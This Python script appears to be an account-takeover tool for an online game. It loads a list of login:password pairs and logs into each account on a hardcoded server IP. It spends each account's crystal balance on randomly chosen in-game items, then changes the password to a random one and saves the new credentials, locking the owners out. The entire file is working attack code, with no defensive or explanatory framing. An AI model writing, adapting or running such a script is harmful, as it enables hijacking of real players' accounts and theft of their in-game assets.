from proxyclient import ProxyClient
import json
import random

destination_ip = "135.125.188.169"
destination_port = 6969

if __name__ == '__main__':
    with open('data/items.txt') as file:
        items = [line.rstrip('\n') for line in file]
    with open('data/accounts.txt') as file:
        accounts = [line.rstrip('\n') for line in file]
    with open('data/passwords.txt') as file:
        passwords = [line.rstrip('\n') for line in file]
    remain = accounts.copy()
    for account in accounts:
        try:
            login, password = account.split(':')
            client = ProxyClient(destination_ip, destination_port)
            try:
                client.handshake()
            except ValueError:
                print("IP BANNED!")
                break
            isSuccesAuth = client.auth(login, password)
            if not isSuccesAuth:
                print(f"Account {login} is online or invalid credentials")
                client.disconnect()
                continue
            init_panel = client.receive_data("lobby;init_panel;")
            current_user_info = json.loads(init_panel.split(';')[2])
            crystalls = current_user_info['crystall']
            if crystalls > 20000:
                max_score_count = crystalls // 4000
                score_count = random.randint(1, max_score_count)
                client.buy_item("1000_scores_m0", score_count)
                crystalls -= score_count * 4000
                print(f"Buyed {score_count} scores")
            if crystalls > 50:
                max_armor_count = crystalls // 50
                armor_count = random.randint(1, max_armor_count)
                client.buy_item("armor_m0", armor_count)
                crystalls -= armor_count * 50
                print(f"Buyed {armor_count} armors")
            if crystalls > 50:
                max_damage_count = crystalls // 50
                damage_count = random.randint(1, max_damage_count)
                client.buy_item("double_damage_m0", damage_count)
                crystalls -= damage_count * 50
                print(f"Buyed {damage_count} damage")
            if crystalls > 50:
                max_nitro_count = crystalls // 50
                nitro_count = random.randint(1, max_nitro_count)
                client.buy_item("n2o_m0", nitro_count)
                crystalls -= nitro_count * 50
                print(f"Buyed {nitro_count} nitro")
            if crystalls > 150:
                max_health_count = crystalls // 150
                health_count = random.randint(1, max_health_count)
                client.buy_item("health_m0", health_count)
                print(f"Buyed {health_count} health")
                crystalls -= health_count * 150
            if crystalls > 5000:
                for item in items:
                    client.buy_item(item, 1)
            random_pwd = random.choice(passwords)
            isChanged = client.change_password(password, random_pwd)
            if isChanged:
                password = random_pwd
                print(f"Changed password on {login} to {random_pwd}")
            else:
                print(f"Can't change password on {login}")
            with open('data/proccessed.txt', 'a') as file:
                file.write(f"{login}:{password}")
            remain.remove(account)
            with open("data/remain.txt", 'w') as file:
                for line in remain:
                    file.write("%s\n" % line)
            print(f"Processed account {login}")
        except:
            print(f"Error with account {account}")
        client.disconnect()
    input("Press enter to exit..")
            
